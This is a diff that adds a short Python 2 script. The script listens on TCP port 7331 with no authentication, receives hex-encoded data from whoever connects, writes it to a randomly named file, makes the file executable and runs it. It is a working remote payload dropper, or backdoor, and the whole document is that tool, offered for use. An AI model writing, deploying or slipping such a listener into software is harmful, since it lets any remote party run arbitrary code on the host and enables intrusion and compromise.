@@ -1,0 +1,39 @@
+#!/usr/bin/python2
+
+import socket
+import subprocess
+import os
+import random
+import string
+
+#please edit the following in order to use this script to it's potential
+port = 7331
+
+def main():
+	socket_ = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	socket_.bind(('', port))
+	socket_.listen(1)
+	conn, addr = socket_.accept()
+	looping = 1
+	while looping:
+		data = conn.recv(1024)
+		if not data:
+			break
+			looping = 1
+		conn.sendall(data)
+		plain_data = data.decode("hex")
+		print plain_data
+		payload_drop = ''.join(random.choice(string.ascii_uppercase) for _ in range(12))
+		open(payload_drop,"w").write(plain_data)
+		fp = open(payload_drop,"r").read().split("\n")
+		final = ""
+		for s in fp:
+			final += s+"\n"
+		open(payload_drop+"1","w").write(final.replace(r'\r',''))
+		subprocess.Popen(["chmod","+x",payload_drop+"1"]).wait()
+		subprocess.Popen(["dos2unix",payload_drop+"1"])
+		os.system("./{0}".format(payload_drop+"1"))
+	conn.close()
+
+if __name__ == "__main__":
+	main()
